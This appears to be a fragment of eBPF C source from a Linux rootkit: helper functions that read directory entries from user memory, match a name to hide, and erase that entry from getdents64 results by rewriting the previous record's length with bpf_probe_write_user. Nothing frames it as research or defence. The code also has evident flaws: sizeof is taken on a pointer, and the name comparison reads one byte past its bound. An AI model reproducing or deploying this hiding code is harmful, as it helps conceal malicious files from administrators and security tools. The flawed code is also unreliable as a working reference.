static __always_inline
int read_user__dirname(u8 * dst, char * raw_data) {
   return bpf_probe_read_user_str(dst, sizeof(dst), raw_data);
}

static __always_inline
int read_user__reclen(u16 * dst, unsigned short * raw_data) {
   return bpf_probe_read(dst, sizeof(*dst), raw_data);
}

static __always_inline
struct linux_dirent64 * get_dirent(u64 dirents_buf, int bpos) {
   return (struct linux_dirent64 *)(dirents_buf + bpos);
}

static __always_inline
bool is_end_of_buff(int bpos, long buff_size) {
   return bpos >= buff_size;
}

static __always_inline
bool is_dirname_to_hide(int max_str_len, u8 * dirname, u8 * dirname_to_hide) {
   int i = 0;
   for (; i < max_str_len; i++) {
      if (dirname[i] != dirname_to_hide[i]) return false;
   }
   return dirname[i] == 0x00;
}

static __always_inline
bool remove_curr_dirent(struct dirents_data_t * data) {
   struct linux_dirent64 *dirent_previous = get_dirent(*data->dirents_buf, (data->bpos - data->d_reclen_prev));
   u16 d_reclen_new = data->d_reclen + data->d_reclen_prev;
   return bpf_probe_write_user(&dirent_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new)) == 0;
}
